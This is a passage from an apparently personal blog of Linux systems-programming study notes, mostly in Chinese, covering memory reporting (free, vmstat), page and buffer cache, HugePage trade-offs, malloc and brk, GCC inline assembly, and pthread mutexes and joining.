= exbibyte = 1024 PiB = 1,152,921,504,606,846,976 bytes</span><br></pre></td></tr></table></figure></li></ul><h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">free  displays the total amount of free and used physical and swap memory</span><br><span class="line">in the system, as well as the buffers and caches used by the kernel.  The</span><br><span class="line">information  is  gathered by parsing /proc/meminfo. The displayed columns</span><br><span class="line">are:</span><br><span class="line"></span><br><span class="line">total  Total installed memory (MemTotal and SwapTotal in /proc/meminfo)</span><br><span class="line"></span><br><span class="line">used   Used memory (calculated as total - free - buffers - cache)</span><br><span class="line"></span><br><span class="line">free   Unused memory (MemFree and SwapFree in /proc/meminfo)</span><br><span class="line"></span><br><span class="line">shared Memory used (mostly) by tmpfs (Shmem in /proc/meminfo)</span><br><span class="line"></span><br><span class="line">buffers</span><br><span class="line">       Memory used by kernel buffers (Buffers in /proc/meminfo)</span><br><span class="line"></span><br><span class="line">cache  Memory used by the page cache and slabs (Cached  and  SReclaimable</span><br><span class="line">       in /proc/meminfo)</span><br><span class="line"></span><br><span class="line">buff/cache</span><br><span class="line">       Sum of buffers and cache</span><br><span class="line"></span><br><span class="line">available</span><br><span class="line">       Estimation of how much memory is available for starting new appli‐</span><br><span class="line">       cations, without swapping. Unlike the data provided by  the  cache</span><br><span class="line">       or  free fields, this field takes into account page cache and also</span><br><span class="line">       that not all reclaimable memory slabs will  be  reclaimed  due  to</span><br><span class="line">       items  being  in  use (MemAvailable in /proc/meminfo, available on</span><br><span class="line">       kernels 3.14, emulated on kernels 2.6.27+, otherwise the  same  as</span><br><span class="line">       free)</span><br></pre></td></tr></table></figure><ul><li>Buffers vs Cached(<a href="https://access.redhat.com/solutions/406773#diag" target="_blank" rel="noopener">Ref</a>, <a href="https://www.kernel.org/doc/Documentation/filesystems/proc.txt" target="_blank" rel="noopener">Ref</a>)<ul><li>Buffers: Memory in buffer cache, so relatively temporary storage for raw disk blocks. This shouldn’t get very large.</li><li>Cached: Memory in the pagecache (Diskcache and Shared Memory)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  Buffers: Relatively temporary storage for raw disk blocks</span><br><span class="line">          shouldn&apos;t get tremendously large (20MB or so)</span><br><span class="line">  Cached: in-memory cache for files read from the disk (the</span><br><span class="line">          pagecache).  Doesn&apos;t include SwapCached</span><br><span class="line">SwapCached: Memory that once was swapped out, is swapped back in but</span><br><span class="line">          still also is in the swapfile (if memory is needed it</span><br><span class="line">          doesn&apos;t need to be swapped out AGAIN because it is already</span><br><span class="line">          in the swapfile. This saves I/O)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="vmstat"><a href="#vmstat" class="headerlink" title="vmstat"></a>vmstat</h4>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">FIELD DESCRIPTION FOR VM MODE</span><br><span class="line">   Procs</span><br><span class="line">       r: The number of runnable processes (running or waiting for run time).</span><br><span class="line">       b: The number of processes in uninterruptible sleep.</span><br><span class="line"></span><br><span class="line">   Memory</span><br><span class="line">       swpd: the amount of virtual memory used.</span><br><span class="line">       free: the amount of idle memory.</span><br><span class="line">       buff: the amount of memory used as buffers.</span><br><span class="line">       cache: the amount of memory used as cache.</span><br><span class="line">       inact: the amount of inactive memory.  (-a option)</span><br><span class="line">       active: the amount of active memory.  (-a option)</span><br><span class="line"></span><br><span class="line">   Swap</span><br><span class="line">       si: Amount of memory swapped in from disk (/s).</span><br><span class="line">       so: Amount of memory swapped to disk (/s).</span><br><span class="line"></span><br><span class="line">   IO</span><br><span class="line">       bi: Blocks received from a block device (blocks/s).</span><br><span class="line">       bo: Blocks sent to a block device (blocks/s).</span><br><span class="line"></span><br><span class="line">   System</span><br><span class="line">       in: The number of interrupts per second, including the clock.</span><br><span class="line">       cs: The number of context switches per second.</span><br><span class="line"></span><br><span class="line">   CPU</span><br><span class="line">       These are percentages of total CPU time.</span><br><span class="line">       us: Time spent running non-kernel code.  (user time, including nice time)</span><br><span class="line">       sy: Time spent running kernel code.  (system time)</span><br><span class="line">       id: Time spent idle.  Prior to Linux 2.5.41, this includes IO-wait time.</span><br><span class="line">       wa: Time spent waiting for IO.  Prior to Linux 2.5.41, included in idle.</span><br><span class="line">       st: Time stolen from a virtual machine.  Prior to Linux 2.6.11, unknown.</span><br></pre></td></tr></table></figure><ul><li>buff vs cache<blockquote><p><a href="http://tldp.org/LDP/sag/html/buffer-cache.html" target="_blank" rel="noopener">tldp-buffer-cache</a></p><ul><li>By reading the information from disk only once and then keeping it in memory until no longer needed, one can speed up all but the first read. This is called disk buffering, and the memory used for the purpose is called the buffer cache.</li><li>To make the most efficient use of real memory, Linux automatically uses all free RAM for buffer cache, but also automatically makes the cache smaller when programs need more memory. Under Linux, you do not need to do anything to make use of the cache, it</li></ul></blockquote></li></ul><h3 id="HugePage"><a href="#HugePage" class="headerlink" title="HugePage"></a>HugePage</h3><ul><li>好处<ul><li>增加TLB命中率</li><li>减小页表大小</li><li>如果可以把多级页表的级数减少，则可以减小查页表时间</li></ul></li><li><p>缺点</p><ul><li>有一些需要页对齐的场景那么为了对齐浪费的空间就比较多</li><li>页表提供的内存保护是以页为单位的</li><li>缺页时需要调入的东西增加</li><li>共享内存时需要共享整数个页那么大的块（我认为如此，因为是通过在页表中填入相同的物理页地址来共享内存的）</li><li>brk上调brk指针时，需要上调到页的边界，所以如果使用HugePage，会导致每次都分配很多虚拟内存（当然只要这些内存没有被读写，就不会分配物理内存）</li><li><p>Cache的命中率可能会降低，比如如果有的东西需要放在相邻的两个页上，那么4K页时，其实两个东西都可以缓存在L1，但是对于4M的页则不行</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure><p> Model name:          Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz<br> L1d cache:           32K<br> L1i cache:           32K<br> L2 cache:            256K<br> L3 cache:            8192K</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure></li><li><p>因为程序所占用的物理内存都需要在页表有记录，那么hugePage意味着小应用会占用更多内存</p></li><li>mmap<blockquote><p>on Linux, the mapping will be created at a nearby page boundary.<br>offset must be a multiple of the page size as returned by sysconf(_SC_PAGE_SIZE).</p></blockquote></li></ul></li><li><p>其他影响</p><ul><li>块（文件系统的一种抽象，文件系统的最小寻址单元，只能基于块来访问文件系统）不能比page大（This is an artificial constraint that could go away in the future），所以hugepage会使得块可以很大</li></ul></li></ul><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><ul><li><p>调用并分配1GB的内存，是否物理内存就会少1G？一方面，CopyOnWrite，所以如果没有写，是不会的。另一方面，空闲链表</p></li><li><p>malloc的内存对齐</p><ul><li><blockquote><p>The malloc() and calloc() functions return a pointer to the allocated memory that is <strong>suitably aligned for any kind of variable</strong>.  (Ref from malloc’s man)</p></blockquote></li><li>在我的x86-64的机器上试了几次，返回的是16B对齐的内存 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n%p\n%p\n"</span>, <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)), <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)), <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">short</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 0x14bd260</span></span><br><span class="line"><span class="comment">// 0x14bd280</span></span><br><span class="line"><span class="comment">// 0x14bd2a0</span></span><br></pre></td></tr></table></figure></li></ul><ul><li>nginx在<code>core/ngx_palloc.c</code>的<code>ngx_create_pool</code>使用16中调用了<code>ngx_memalign</code>，<code>ngx_memalign</code>的一个实现是直接使用<code>malloc</code></li></ul></li><li><p>堆内存边界被称为<code>program break</code>，使用<code>brk</code>和<code>sbrk</code>可以调整。一开始<code>program break</code>位于未初始化的数据段末尾之后。使用<code>brk</code>等抬高<code>program break</code>后，物理内存页尚未分配，内核会在进程首次此试图访问这些虚拟内存地址时自动分配新的物理内存页</p></li><li><p>虚拟内存以页为单位进行分配，所以调用brk指定的end addr实际上会round up到下一个page boundary</p><blockquote><p>The brk() system call sets the program break to the location specified by <code>end_data_segment</code>. Since virtual memory is allocated in units of pages, end_data_segment is effectively rounded up to the next page boundary.</p></blockquote></li><li><p>program break可以设定的精确上限取决于</p><ul><li>进程中对数据段大小的资源限制<code>RLIMIT_DATA</code></li><li>内存映射</li><li>共享内存段</li><li>共享库的位置（因为堆向上增长就会遇到共享库的位置）</li></ul></li></ul><h3 id="page-cache和buffer-cache"><a href="#page-cache和buffer-cache" class="headerlink" title="page cache和buffer cache"></a>page cache和buffer cache</h3><ul><li><p>页缓存（page cache）针对以页为单位的所有操作，并考虑了特定体系结构上的页长度。内存映射技术、其他类型的文件访问也是基于内核中的这一技术实现的，所以页缓存实际上负责了块设备的大部分缓存工作</p></li><li><p>buffer cache</p><ul><li>a buffer is the in-memory representation of a single physical disk block. Buffers act as descriptors that map pages in memory to disk blocks;</li><li>the page cache（这个page cache应该是指buffer cache这种page cache）also reduces disk access during block I/O operations by both <strong>caching disk blocks</strong> and <strong>buffering block I/O operations</strong> until later</li><li>this caching is often referred to as the <strong>buffer cache</strong>, although as implemented it is not a separate cache but <strong>is part of the page cache</strong></li><li>In earlier kernels, there were two separate disk caches: the page cache and the buffer cache. <strong>The former cached pages; the latter cached buffers</strong>.The two caches were not unified: A disk block could exist in both caches simultaneously.</li><li>Today, we have one disk cache: the page cache. <strong>The kernel still needs to use buffers, however, to represent disk blocks in memory</strong>. Conveniently, <strong>the buffers describe the mapping of a block onto a page, which is in the page cache.</strong></li></ul></li></ul><h3 id="GCC内联汇编"><a href="#GCC内联汇编" class="headerlink" title="GCC内联汇编"></a>GCC内联汇编</h3><ul><li>以下来自<a href="http://csapp.cs.cmu.edu/3e/waside/waside-embedded-asm.pdf" target="_blank" rel="noopener">CSAPP Assembly Webaside</a></li><li>扩展形式的汇编的目的<ul><li>帮助编译器correctly set up the required source values, execute the assembly instructions, and make use of the computed results</li><li>important program values are not overwritten by the assembly code instructions</li></ul></li><li>形式：以<code>:</code>分割，依次为code-string、output-list(results generated by the assembly code)、input-list(results generated by the assembly code)、overwrite-list(registers that are overwritten by the assembly code)</li><li>code-string<ul><li>GCC3.1之前，在code-string中用<code>%0, %1, ..., %9</code>来引用output-list和input-list中的操作数（<code>%n</code>的<code>n</code>, based on the order of the operands in the two lists）</li><li>GCC3.1开始，可以使用<code>%[name]</code>来引用</li><li>寄存器名字用<code>%%reg_name</code>来引用</li><li>If multiple instructions are given, it is critical that <strong>return characters</strong> be inserted between them. 一种方法是（finish all but the final string with the sequence \n\t）</li></ul></li><li><p>output-string</p><ul><li>a comma-separated list</li><li><p>each list element containing three components in the form <code>[name] tag (expr)</code>(giving the name of the operand, the output constraint(specifies constraints on the use and location of the output operand), and the C expression indicating the destination for the instruction result)</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;=r&quot; Update value stored in a register</span><br><span class="line">&quot;+r&quot; Read and update value stored in a register</span><br><span class="line">&quot;=m&quot; Update value stored in memory</span><br><span class="line">&quot;+m&quot; Read and update value stored in memory</span><br><span class="line">&quot;=rm&quot; Update value stored in a register or in memory</span><br><span class="line">&quot;+rm&quot; Read and update value stored in a register or in memory</span><br></pre></td></tr></table></figure></li><li><p>The expression expr can be any assignable value (known in C as an lvalue). The compiler will generate the necessary code sequence to perform the assignment</p></li></ul></li><li>input-string<ul><li>The input list entries have the same format as output-string</li><li>the tags are of the form tag “r”, “m”, or “rm”, indicating that the operand will be read from a register, memory, or either, respectively</li><li>Each input operand can be any C expression. The compiler will generate the necessary code to evaluate the expression</li></ul></li><li><p>overwrite-list</p><ul><li>Each input operand can be any C expression. The compiler will generate the necessary code to evaluate the expression</li></ul></li><li><p>we can simplify the code even more and make use of GCC’s ability to work with different data types. GCC uses the type information for an operand when determining which register to substitute for an operand name in the code string<br> 原先的版本，手动指定寄存器</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmult_ok2</span><span class="params">(<span class="keyword">long</span> x, <span class="keyword">long</span> y, <span class="keyword">long</span>* dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result;</span><br><span class="line">    dest = x * y;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"setae %%bl # Set low-order byte\n\t"</span></span><br><span class="line">        <span class="string">"movzbl %%bl,%[val] # Zero extend to be result"</span></span><br><span class="line">        : [ val ] <span class="string">"=r"</span>(result) <span class="comment">/* Output */</span></span><br><span class="line">        :                      <span class="comment">/* No inputs */</span></span><br><span class="line">        : <span class="string">"%bl"</span>                <span class="comment">/* Overwrites */</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 新版本，让GCC指定寄存器</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Uses extended asm to get reliable code */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmult_ok3</span><span class="params">(<span class="keyword">long</span> x, <span class="keyword">long</span> y, <span class="keyword">long</span>* dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> bresult;</span><br><span class="line">    *dest = x * y;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"setae %[b] # Set result"</span></span><br><span class="line">        : [b] <span class="string">"=r"</span>(bresult) <span class="comment">/* Output */</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)bresult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>例子</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">umult_ok</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> x, <span class="keyword">unsigned</span> <span class="keyword">long</span> y, <span class="keyword">unsigned</span> <span class="keyword">long</span>* dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> bresult;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"movq %[x],%%rax # Get x\n\t"</span></span><br><span class="line">        <span class="string">"mulq %[y] # Unsigned long multiply by y\n\t"</span></span><br><span class="line">        <span class="string">"movq %%rax,%[p] # Store low-order 8 bytes at dest\n\t"</span></span><br><span class="line">        <span class="string">"setae %[b] # Set result"</span></span><br><span class="line">        : [p] <span class="string">"=m"</span>(*dest), [b] <span class="string">"=r"</span>(bresult) <span class="comment">/* Outputs */</span></span><br><span class="line">        : [x] <span class="string">"r"</span>(x), [y] <span class="string">"r"</span>(y)             <span class="comment">/* Inputs */</span></span><br><span class="line">        : <span class="string">"%rax"</span>, <span class="string">"%rdx"</span>                     <span class="comment">/* Overwrites */</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)bresult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><blockquote><p>如果我们的汇编语句必须在我们放置它的地方执行，(即，必须不被作为一个优化而移出循环)，则将volatile放在asm之后。所以防止它被移动、删除和任何改变，我们如此声明<code>asm volatile(... : ... : ... : ...);</code> 当我们必须非常小心时，使用<code>__volatile__</code>。如果我们的汇编只是做一些计算而没有任何副作用，最好不要使用volatile关键字。忽略它将帮助GCC优化代码使其更优美。(Ref from<a href="https://www.jianshu.com/p/10e8a7b4f980" target="_blank" rel="noopener">译：GCC内联汇编入门</a>)</p></blockquote></li><li>受影响列表中的<code>memory</code>字样(<a href="https://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.html" target="_blank" rel="noopener">Ref from</a>)<blockquote><ul><li>The “memory” clobber tells the compiler that the assembly code <strong>performs memory reads or writes to items other than those listed in the input and output operands (for example, accessing the memory pointed to by one of the input parameters)</strong>. </li><li><strong>To ensure memory contains correct values, GCC may need to flush specific register values to memory before executing the asm</strong>. </li><li>Further, the compiler does not assume that any values read from memory before an asm remain unchanged after that asm; it reloads them as needed.</li><li><strong>Using the “memory” clobber effectively forms a read/write memory barrier for the compiler.</strong></li><li>Note that this clobber does not prevent the processor from doing speculative reads past the asm statement. To prevent that, <strong>you need processor-specific fence instructions.</strong></li></ul></blockquote></li><li>受影响列表中的<code>cc</code>字样(<a href="https://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.html" target="_blank" rel="noopener">Ref from</a>)<blockquote><ul><li>The “cc” clobber indicates that the assembler code modifies <strong>the flags register</strong> </li><li>On some machines, GCC represents the condition codes as a specific hardware register; “cc” serves to name this register. </li><li>On other machines, condition code handling is different, and specifying “cc” has no effect. But it is valid no matter what the target.</li></ul></blockquote></li></ul><h3 id="mutex"><a href="#mutex" class="headerlink" title="mutex"></a>mutex</h3><ul><li>文件锁（使用fcntl加锁、解锁一片文件区域）和信号量的锁定和解锁都需要syscall。mutex使用机器语言的原子操作（在内存中执行、对所有线程可见）来实现，只有发生锁争用时才需要syscall，所以mutex比前两者性能高</li><li>linux上的mutex使用futex（快速用户空间互斥量）实现，发生锁争用时调用futex syscall</li><li><strong>SUSv3规定，初始化一个已经初始化过的的互斥量将导致未定义行为</strong></li><li><strong>依照SUSv3的规定，对某一互斥量的副本（copy）执行各种操作将导致未定义的结果。此类操作只能施之于如下两类互斥量的“真身”</strong></li><li>静态分配的mutex可以使用<code>PTHREAD_MUTEX_INITIALIZER</code>初始化</li><li>在如下情况下，必须使用函数<code>pthread_mutex_init()</code>，而非静态初始化互斥量<ul><li>动态分配于堆中的互斥量</li><li>互斥量是在栈中分配的自动变量</li><li>初始化经由静态分配，且不使用默认属性的互斥量</li></ul></li><li>destroy mutex<ul><li>当不再需要经由自动或动态分配的互斥量时，应使用<code>pthread_mutex_destroy()</code>将其销毁</li><li>对于使用<code>PTHREAD_MUTEX_INITIALIZER</code>静态初始化的互斥量，无需调用<code>pthread_mutex_destroy()</code></li><li><strong>只有当互斥量处于未锁定状态，且后续也无任何线程企图锁定它时，将其销毁才是安全的</strong></li><li><strong>若互斥量驻留于动态分配的一片内存区域中，应在释放（free）此内存区域前将其销毁。对于自动分配的互斥量，也应在宿主函数返回前将其销毁</strong></li><li>经由<code>pthread_mutex_destroy()</code>销毁的互斥量，可调用<code>pthread_mutex_init()</code>对其重新初始化</li></ul></li><li>死锁解决方案<ul><li>定义互斥锁的层级关系，按照层级去获取锁</li><li>对于第一个锁使用<code>pthread_mutex_lock</code>，其他锁使用<code>try_lock</code>。如果有一个<code>try_lock</code>失败，则释放所有已获得的锁，一段时间后再试。这是通过解决“占有并等待”这个条件来解决问题的</li></ul></li></ul><h3 id="sched-yield"><a href="#sched-yield" class="headerlink" title="sched_yield"></a><code>sched_yield</code></h3><blockquote><p>sched_yield()的操作是比较简单的。如果存在与调用进程的优先级相同的其他排队的可运行进程，那么调用进程会被放在队列的队尾，队列中队头的进程将会被调度使用CPU。如果在该优先级队列中不存在可运行的进程，那么sched_yield()不会做任何事情，调用进程会继续使用CPU。<strong>非实时进程使用sched_yield()的结果是未定义的</strong>。</p></blockquote><h3 id="mlock"><a href="#mlock" class="headerlink" title="mlock"></a><code>mlock</code></h3><ul><li><blockquote><p>Under  Linux,  mlock(),  mlock2(),  and munlock() automatically <strong>round addr down to the nearest page boundary</strong>.  However, the POSIX.1 specification of mlock() and munlock() allows an implementation to require that addr is page aligned, so portable applications should ensure this.(Ref from man page)</p></blockquote></li><li><p>可以避免被交换到swap分区，一般用于real-time进程。跟信息安全有关的进程也会这样做，避免内存page被交换到swap分区，从而hack可以从磁盘上读取这些信息，甚至是在进程结束后</p><blockquote><p>cryptographic security software often handles critical bytes like passwords or secret keys as data structures.  As a result of paging, these secrets could be transferred onto a persistent swap store medium, where they might be  accessible to the enemy  long <strong>after the security software has erased the secrets in RAM and terminated</strong>.</p></blockquote></li><li><blockquote><p>But be aware that the suspend mode on laptops and some desktop computers will save a copy of the system’s RAM to disk, regardless of memory locks.</p></blockquote></li></ul><h3 id="pthread"><a href="#pthread" class="headerlink" title="pthread"></a>pthread</h3><ul><li><p>joinable vs detached </p><ul><li>A thread may either be joinable or detached</li><li>If a thread is  joinable, then  another thread can call pthread_join(3) to wait for the thread to terminate and fetch its exit status</li><li><strong>Only when a  terminated  joinable thread  has  been joined are the last of its resources released back to the system</strong>(看起来就像进程的wait一样).</li><li><strong>When a detached thread terminates, its resources are automatically  released back to the system</strong>: it is not possible to join with the thread in order to obtain its exit status. <strong>Making  a  thread  detached is useful for some types of daemon threads whose exit status the application does not need to care about</strong>.</li><li><strong>By default, a new  thread  is created  in  a joinable state</strong>, unless attr was set to create the thread in a detached state (using pthread_attr_setdetachstate(3))</li><li><p>以下代码输出<code>Resource deadlock avoided</code></p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = pthread_join(pthread_self(), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(t!=<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, strerror(t));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>以下代码不退出</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">func</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    <span class="keyword">int</span> t = pthread_create(&amp;tid, <span class="literal">NULL</span>, func, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(t!=<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, strerror(t));</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>以下代码的问题是，主线程退出后，另一个线程对主线程栈上的内容进行操作，结果难以预料<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">threadFunc</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">someStruct</span> *<span class="title">pbuf</span> = (<span class="title">struct</span> <span class="title">someStruct</span> *)<span class="title">arg</span>;</span></span><br><span class="line">  <span class="comment">/* Do some work with structure pointed to by 'pbuf' */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">someStruct</span> <span class="title">buf</span>;</span></span><br><span class="line">  pthread_create(&amp;thr, <span class="literal">NULL</span>, threadFunc, (<span class="keyword">void</span> *)&amp;buf);</span><br><span class="line">  pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h3 id="条件变量"><a href="#条件变量" class="headerlink" title="条件变量"></a>条件变量</h3><ul><li>静态分配的条件变量可以使用<code>PTHREAD_COND_INITALIZER</code>来完成初始化</li></ul><h3 id="PIPE-and-FIFO"><a href="#PIPE-and-FIFO" class="headerlink" title="PIPE and FIFO"></a>PIPE and 